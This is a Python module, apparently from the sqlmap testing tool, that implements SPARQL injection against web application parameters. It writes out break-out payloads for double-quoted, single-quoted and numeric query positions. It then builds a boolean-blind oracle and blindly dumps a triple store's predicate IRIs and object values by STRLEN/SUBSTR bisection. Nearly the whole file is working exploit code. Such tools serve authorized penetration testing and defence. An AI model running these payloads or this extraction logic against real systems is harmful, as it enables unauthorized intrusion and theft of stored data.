#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

"""
SPARQL injection ('--sparql').

An application that concatenates user input into a SPARQL query hands over the whole graph pattern
language, not just a value. The typical surface is a search feature whose input lands inside a string
literal in a FILTER (FILTER(?name = "<input>")) or a numeric/term position. Breaking out of that literal
turns the FILTER into an attacker-controlled boolean, which is a boolean-based blind oracle: the row the
query returns appears or disappears according to a condition sqlmap controls.

  detect   break the literal, then confirm a reproducible true/false differential (1=1 vs 1=2)
  confirm  a SPARQL-only construct (isIRI / BOUND-of-a-subquery) that plain SQL does not evaluate,
           so the finding is attributed to SPARQL rather than to ordinary SQL injection
  extract  through the oracle, blindly recover data from the store: the number of triples and of
           distinct predicates, each predicate IRI, and a sample of triple OBJECTS - all by
           STRLEN + SUBSTR binary search behind an EXISTS sub-pattern

Objects only, deliberately: the objects are where the data sits, the predicates are already enumerated
in their own pass, and reassembling whole (subject, predicate, object) rows would mean three independent
blind walks per row that all have to agree on the same ordering - triple the request count for the two
components that carry the least.

Everything is confirmed by a reproducible boolean differential or a per-run random value; nothing is
inferred from a payload merely "looking like" it worked. The extraction is schema-agnostic: it walks the
default graph via COUNT / ORDER BY / OFFSET sub-queries, so it needs no prior knowledge of the ontology.
"""

import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.common import urldecode
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.utils.nonsql import InconclusiveError
from lib.utils.nonsql import resolveBit
from lib.utils.nonsql import sqlErrorPresent
from lib.utils.nonsql import blockedStatus
from lib.utils.nonsql import ratio as _ratio
from lib.utils.nonsql import userDecision
from lib.utils.nonsql import userOracleActive
from lib.core.settings import SPARQL_CHAR_MAX
from lib.core.settings import SPARQL_CHAR_MIN
from lib.core.settings import SPARQL_ERROR_REGEX
from lib.core.settings import SPARQL_ERROR_SIGNATURES
from lib.core.settings import SPARQL_MAX_LENGTH
from lib.core.settings import SPARQL_MAX_PREDICATES
from lib.core.settings import SPARQL_MAX_RECORDS
from lib.core.settings import SQLMAP_ENVIRONMENT_PREFIX
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange
from thirdparty.six.moves.urllib.parse import quote as _quote


SENTINEL = randomStr(length=10, lowercase=True)
# a NUMERIC sentinel for the unquoted slot: the base has to be a valid SPARQL term there, and a random
# word is not one - it is a syntax error, which is why the numeric boundary could never fire before
NUMBER_SENTINEL = randomStr(length=9, alphabet="123456789")

SPARQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

# What the injected value STARTS with, chosen so the application's own comparison matches nothing and the
# injected predicate alone decides whether a row comes back.
_BASE_STRING = "string"         # a random word, inside the quotes the application already wrote
_BASE_NUMBER = "number"         # a random integer, for an unquoted numeric/term slot

Boundary = namedtuple("Boundary", ("prefix", "suffix", "base"))

# Detection boundaries, priority-ordered. Each breaks out of the user-controlled position and rebuilds a
# syntactically valid FILTER whose truth is (predicate). `prefix`/`suffix` wrap a later predicate for
# extraction; `sentinel` marks an OR-style boundary (base value matches nothing, so the injected predicate
# alone decides whether any row is returned).
#
# NOTE every boundary is built with SPARQL's `||` and NEVER `&&`: a raw '&' inside a GET value is the
# parameter delimiter, so sqlmap would split the request and the query would arrive truncated (a 500 that
# looks like a dead oracle). '||' with a base value that matches nothing reduces the FILTER to the
# injected predicate, which is exactly what the extraction oracle needs.
#   (true_break, false_break, prefix, suffix, base)
_BOUNDARY_TABLE = (
    # double-quoted string literal
    ('" || (1=1) || ""!="', '" || (1=2) || ""!="', '" || (', ') || ""!="', _BASE_STRING),
    # single-quoted string literal
    ("' || (1=1) || ''!='", "' || (1=2) || ''!='", "' || (", ") || ''!='", _BASE_STRING),
    # numeric / unquoted term (input not wrapped in quotes). Nothing to close and nothing to re-balance:
    # '=' binds tighter than '||', so FILTER(?x = <num> || (pred)) parses as (?x = <num>) || (pred) and
    # reduces to the injected predicate because <num> matches no row.
    (" || (1=1)", " || (1=2)", " || (", ")", _BASE_NUMBER),
)

# Codepoints for blind character recovery. The set is CONTIGUOUS on purpose: the recovery is a
# lexicographic '>=' bisection, so a hole does not make the excluded character unrecoverable - it makes
# the bisection converge on the hole's neighbour and report a DIFFERENT character, silently. '"' and '\'
# therefore stay in the charset and are emitted as their SPARQL escapes rather than dropped.
_CS_ORDS = [_ for _ in xrange(SPARQL_CHAR_MIN, SPARQL_CHAR_MAX + 1)]

# ECHAR escapes: these two cannot appear raw inside a double-quoted SPARQL literal (STRING_LITERAL2)
_ESCAPES = {0x22: '\\"', 0x5c: "\\\\"}


def _literal(ordinal):
    """One codepoint as a double-quoted SPARQL string literal."""
    return '"%s"' % _ESCAPES.get(ordinal, chr(ordinal))


def _delim(place):
    return conf.paramDel or (';' if place == PLACE.COOKIE else '&')


def _confParameters(place):
    return conf.parameters.get(place) or ""


def _originalValue(place, parameter):
    # decoded on the way in, re-encoded by _send() on the way out, so the module works in plain text
    # and a value carrying %XX/'+' round-trips to exactly what the application originally received
    for pair in _confParameters(place).split(_delim(place)):
        if '=' in pair:
            name, _, value = pair.partition('=')
            if name.strip() == parameter:
                return urldecode(value, convall=True)
    return None


def _replaceSegment(place, parameter, value):
    retVal = []
    for pair in _confParameters(place).split(_delim(place)):
        if '=' in pair:
            name, _, old = pair.partition('=')
            retVal.append("%s=%s" % (name, value if name.strip() == parameter else old))
        elif pair:
            retVal.append(pair)
    return _delim(place).join(retVal)


def _send(place, parameter, value, raw=False):
    """One HTTP request with the target parameter set to `value`, reusing sqlmap's request machinery so
    URL, cookies, headers, proxy, delay and encoding all behave exactly as in a normal run.

    `raw=True` returns the body even for a 5xx status. The boolean oracle must NEVER see it (a 500 is not
    a usable true/false sample, hence the default nulling), but the error probe wants exactly that body:
    a triple-store parser diagnostic is commonly served as a 500.

    The value is URL-encoded (as '--ssti' already does) because a payload metacharacter otherwise never
    reaches the query intact: a raw '&' is the parameter delimiter, so the request SPLITS and the store
    sees a truncated query, and '+' arrives as a space. That is not hypothetical - the character-scan
    probes emit both, and unencoded they made a lexicographic bisection answer the '&' comparison
    falsely and silently return the WRONG character ('A&x'/'A)x'/'A+x' all recovered as 'A%x')."""

    if conf.delay:
        time.sleep(conf.delay)

    saved = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, _quote(value, safe=""))
    try:
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, code = Request.getPage(raise404=False, silent=True)
        # A transport failure, a BLOCKED status (403/429) or ANY error status is not a usable oracle
        # sample. Nulling only 5xx was not enough: a front-end that serves its parser failure as a 400
        # with a body carrying no recognisable store signature slipped past _isError(), and when that
        # body happened to resemble the FALSE model the bit was decided FALSE instead of INCONCLUSIVE -
        # a silently wrong character. Measured: a value of 'A(x' behind a validator that 400s the '('
        # probe decoded as 'A\'x'. An unusable sample must be a non-answer, never a cheap false.
        if not raw and (blockedStatus(code) or (code and code >= 400)):
            return None
        return page or ""
    except Exception as ex:
        logger.debug("SPARQL probe request failed: %s" % getUnicode(ex))
        return None
    finally:
        conf.parameters[place] = saved


def _isError(page):
    page = getUnicode(page or "")
    return bool(re.search(SPARQL_ERROR_REGEX, page)) or sqlErrorPresent(page)


def _backendFromError(page):
    page = getUnicode(page or "")
    for backend, regex in SPARQL_ERROR_SIGNATURES:
        if re.search(regex, page):
            return backend
    return None


def _probeError(place, parameter):
    """Break the query context and look for a triple-store parser diagnostic. A hint only - the boolean
    oracle is authoritative."""

    original = _originalValue(place, parameter) or "1"
    normal = _send(place, parameter, original, raw=True)
    # NOTE no '&&' suffix here: a raw '&' in a GET value is the parameter delimiter, so it would split the
    # request rather than break the query. A bare quote / paren is enough to trip the parser.
    for suffix in ('"', "'", ")", " ."):
        broken = _send(place, parameter, original + suffix, raw=True)
        if not broken or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
            continue
        backend = _backendFromError(broken)
        if backend and not _isError(normal):
            return backend, broken
    return None, None


def _boolean(truthy, falsy):
    """Return the reproducible true page when the true/false probes diverge (each independently
    reproducible), else None."""

    truePage = truthy()
    if truePage is None or _isError(truePage):
        return None
    if _ratio(truePage, truthy()) < UPPER_RATIO_BOUND:
        return None

    falsePage = falsy()
    if falsePage is None or _isError(falsePage):
        return None
    if _ratio(falsePage, falsy()) < UPPER_RATIO_BOUND:
        return None

    if userOracleActive():
        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage
    return None


def _detectBoolean(place, parameter):
    """Return (template, payload, boundary) for boolean-blind SPARQL injection, else (None, None, None)."""

    for trueBreak, falseBreak, prefix, suffix, kind in _BOUNDARY_TABLE:
        boundary = Boundary(prefix, suffix, kind)
        base = _base(boundary)
        truePayload = base + trueBreak
        falsePayload = base + falseBreak
        template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                            lambda p=falsePayload: _send(place, parameter, p))
        if template:
            return template, truePayload, boundary
    return None, None, None


def _base(boundary):
    return NUMBER_SENTINEL if boundary.base == _BASE_NUMBER else SENTINEL


def _wrap(base, boundary, predicate):
    return "%s%s%s%s" % (base, boundary.prefix, predicate, boundary.suffix)


# SPARQL-only attribution. EXISTS over a triple pattern plus isIRI() is SPARQL graph-pattern syntax with
# no plain-SQL equivalent, so a true/false divergence here is attributable to a SPARQL engine rather than
# to ordinary SQL injection behind the same quote. The false side uses TWO FILTERs (a conjunction) rather
# than `&&`, keeping the payload free of the '&' that GET transport would treat as a delimiter.
_SPARQL_PREDICATES = (
    ("EXISTS { ?zs ?zp ?zo }", "EXISTS { ?zs ?zp ?zo . FILTER(isIRI(?zo)) FILTER(!isIRI(?zo)) }"),
)


def _confirmSparql(place, parameter, boundary):
    base = _base(boundary)
    for truePred, falsePred in _SPARQL_PREDICATES:
        if _boolean(lambda p=_wrap(base, boundary, truePred): _send(place, parameter, p),
                    lambda p=_wrap(base, boundary, falsePred): _send(place, parameter, p)):
            return True
    return False


def _makeOracle(place, parameter, boundary):
    """Build the extraction oracle by recalibrating both true/false models on the SAME base + boundary the
    predicates use, then classify each later bit RELATIVE to those two models (resolveBit). Returns None -
    disabling extraction - when the models are missing, error pages, or not reliably separable, so a
    finding is never dressed up with fabricated data."""

    cache = {}
    base = _base(boundary)

    def request(payload):
        if payload not in cache:
            page = _send(place, parameter, payload)
            if page is not None and not _isError(page):
                cache[payload] = page
            return page
        return cache[payload]

    truePayload = _wrap(base, boundary, "(1=1)")
    falsePayload = _wrap(base, boundary, "(1=2)")
    trueTemplate = request(truePayload)
    falseTemplate = request(falsePayload)

    if trueTemplate is None or falseTemplate is None or _isError(trueTemplate) or _isError(falseTemplate):
        return None
    if _ratio(trueTemplate, _send(place, parameter, truePayload)) < UPPER_RATIO_BOUND:
        return None
    if _ratio(falseTemplate, _send(place, parameter, falsePayload)) < UPPER_RATIO_BOUND:
        return None
    if _ratio(trueTemplate, falseTemplate) >= UPPER_RATIO_BOUND:
        return None

    def truth(predicate):
        payload = _wrap(base, boundary, predicate)
        page = request(payload)
        usable = page if (page is not None and not _isError(page)) else None

        def fresh():
            p = _send(place, parameter, payload)
            return None if (p is None or _isError(p)) else p
        return resolveBit(usable, trueTemplate, falseTemplate, fresh)

    truth.template = trueTemplate
    truth.cache = cache
    return truth


# --- SPARQL condition builders -------------------------------------------------------------------------
#
# Every extraction condition is an EXISTS over a sub-pattern that BINDS ?v, then a FILTER on ?v. The outer
# `SELECT ?v WHERE { ... }` wrapper is mandatory: a bare `EXISTS { {subquery} FILTER(...) }` silently
# evaluates false on Jena, whereas the wrapped form works.

def _existsBind(inner, cmp):
    return "EXISTS { SELECT ?v WHERE { %s FILTER(%s) } }" % (inner, cmp)


def _cmpAtLeast(expr, n):
    return "%s >= %d" % (expr, n)


def _cmpChar(pos, ordinal):
    # lexicographic '>=' on a single character bisects the codepoint-ordered charset
    return 'SUBSTR(STR(?v),%d,1) >= %s' % (pos, _literal(ordinal))


# inner sub-patterns that bind ?v to something worth reading
_COUNT_TRIPLES = "{ SELECT (COUNT(*) AS ?v) WHERE {?s ?p ?o} }"
_COUNT_PREDICATES = "{ SELECT (COUNT(DISTINCT ?p) AS ?v) WHERE {?s ?p ?o} }"


def _nthPredicate(offset):
    return ("{ SELECT DISTINCT ?p WHERE {?s ?p ?o} ORDER BY ?p LIMIT 1 OFFSET %d } "
            "BIND(STR(?p) AS ?v)" % offset)


def _nthObject(offset):
    return ("{ SELECT ?o WHERE {?s ?p ?o} ORDER BY STR(?o) LIMIT 1 OFFSET %d } "
            "BIND(STR(?o) AS ?v)" % offset)


def _inferCount(truth, inner, maxCount):
    """Recover the integer bound to ?v by `inner` (a COUNT sub-select), by binary search. Returns None
    when the oracle stays inconclusive - a half-bisected count is a wrong number, not a small one, and
    it would go on to drive the enumeration loops."""

    try:
        if not truth(_existsBind(inner, _cmpAtLeast("?v", 1))):
            return 0
        lo, hi = 1, maxCount
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if truth(_existsBind(inner, _cmpAtLeast("?v", mid))):
                lo = mid
            else:
                hi = mid - 1
    except InconclusiveError:
        logger.warning("SPARQL count inference aborted (oracle inconclusive after retries)")
        return None
    return lo


def _inferString(truth, inner, maxLen=SPARQL_MAX_LENGTH):
    """Blindly recover the string bound to ?v by `inner`: length by binary search, then each character by
    bisecting its index in the codepoint-ordered charset."""

    try:
        if not truth(_existsBind(inner, _cmpAtLeast("STRLEN(STR(?v))", 1))):
            return ""

        lo, hi = 1, maxLen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if truth(_existsBind(inner, _cmpAtLeast("STRLEN(STR(?v))", mid))):
                lo = mid
            else:
                hi = mid - 1
        length = lo

        if length >= maxLen:
            # the bisection is bounded, so a value at the bound is a FLOOR, not a measurement - saying
            # nothing here hands back a prefix that reads exactly like a complete IRI or literal
            logger.warning("value is at least %d characters; it is truncated at the cap "
                           "(raise it with %s_SPARQL_MAX_LENGTH)" % (maxLen, SQLMAP_ENVIRONMENT_PREFIX))

        chars = []
        last = len(_CS_ORDS) - 1
        for pos in xrange(1, length + 1):
            # is this character within the recoverable charset at all?
            if not truth(_existsBind(inner, _cmpChar(pos, _CS_ORDS[0]))):
                chars.append("?")
                continue
            clo, chi = 0, last
            while clo < chi:
                cmid = (clo + chi + 1) // 2
                if truth(_existsBind(inner, _cmpChar(pos, _CS_ORDS[cmid]))):
                    clo = cmid
                else:
                    chi = cmid - 1
            chars.append(chr(_CS_ORDS[clo]))
    except InconclusiveError:
        logger.warning("SPARQL string inference aborted (oracle inconclusive after retries)")
        return None
    return "".join(chars)


def _grid(columns, rows):
    columns = [getUnicode(_) for _ in columns]
    rows = [[getUnicode(_) for _ in row] for row in rows]
    widths = []
    for index, column in enumerate(columns):
        width = len(column)
        for row in rows:
            if index < len(row):
                width = max(width, len(getUnicode(row[index])))
        widths.append(width)
    separator = "+-" + "-+-".join("-" * _ for _ in widths) + "-+"

    def line(cells):
        return "| " + " | ".join((getUnicode(cells[index]) if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"

    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])


def _dumpGraph(truth):
    """Schema-agnostic blind dump of the default graph: distinct predicates, then a sample of the triple
    objects (see the module note on why objects rather than whole triples)."""

    predicates = _inferCount(truth, _COUNT_PREDICATES, SPARQL_MAX_PREDICATES)
    triples = _inferCount(truth, _COUNT_TRIPLES, 10 ** 9)
    if predicates is None or triples is None:
        logger.warning("dump aborted: the oracle could not resolve the graph size; detection stands")
        return
    # _inferCount bisects inside a bound, so a count sitting ON that bound is a floor, not a count
    saturated = predicates >= SPARQL_MAX_PREDICATES
    logger.info("default graph holds %s%d distinct predicate(s) and %d triple(s)"
                % ("at least " if saturated else "", predicates, triples))
    if saturated:
        logger.warning("the predicate count hit the %d cap, so the list below is partial "
                       "(raise it with %s_SPARQL_MAX_PREDICATES)" % (SPARQL_MAX_PREDICATES, SQLMAP_ENVIRONMENT_PREFIX))

    predRows = []
    for offset in xrange(min(predicates, SPARQL_MAX_PREDICATES)):
        iri = _inferString(truth, _nthPredicate(offset))
        if iri is None:
            break
        predRows.append([offset + 1, iri])
    if predRows:
        conf.dumper.singleString("SPARQL: distinct predicates in the default graph\n%s"
                                 % _grid(["#", "predicate"], predRows))

    limit = min(triples, SPARQL_MAX_RECORDS)
    objRows = []
    for offset in xrange(limit):
        value = _inferString(truth, _nthObject(offset))
        if value is None:
            break
        objRows.append([offset + 1, value])
    if objRows:
        conf.dumper.singleString("SPARQL: objects in the default graph (first %d, ordered)\n%s"
                                 % (len(objRows), _grid(["#", "object"], objRows)))
    if triples > limit:
        logger.info("dumped the first %d of %d triples (bounded); raise the cap to fetch more" % (limit, triples))


def sparqlScan():
    global SENTINEL, NUMBER_SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)
    NUMBER_SENTINEL = randomStr(length=9, alphabet="123456789")

    debugMsg = "'--sparql' is self-contained: it detects SPARQL injection in HTTP parameters and blindly "
    debugMsg += "dumps the reachable triple store. SQL enumeration switches (--banner, --dbs, --tables, "
    debugMsg += "--users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = found = 0

    for place in (_ for _ in SPARQL_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing SPARQL injection on %s parameter '%s'" % (place, parameter))

            backendHint, _errorPage = _probeError(place, parameter)
            if backendHint:
                logger.info("%s parameter '%s' reaches a SPARQL parser (back-end: '%s')" % (place, parameter, backendHint))

            template, payload, boundary = _detectBoolean(place, parameter)
            if not template:
                continue

            isSparql = _confirmSparql(place, parameter, boundary) or bool(backendHint)
            if not isSparql:
                logger.info("%s parameter '%s' shows a boolean differential but no SPARQL-only construct "
                            "confirmed it; not attributing to SPARQL (may be plain SQL injection)"
                            % (place, parameter))
                continue

            found += 1
            if conf.beep:
                beep()
            backend = backendHint or "Generic SPARQL"
            logger.info("%s parameter '%s' is vulnerable to SPARQL injection (back-end: '%s')"
                        % (place, parameter, backend))
            conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: SPARQL injection\n"
                                     "    Title: SPARQL boolean-based blind\n    Payload: %s=%s\n---"
                                     % (parameter, place, parameter, payload))

            oracle = _makeOracle(place, parameter, boundary)
            if oracle is None:
                logger.info("extraction disabled (true/false models not reliably separable); detection stands")
                continue

            _dumpGraph(oracle)

    if not found:
        if tested:
            logger.warning("no parameter appears to be injectable via SPARQL injection (%d tested)" % tested)
        else:
            logger.warning("no parameters found to test for SPARQL injection")

    logger.info("SPARQL scan complete")
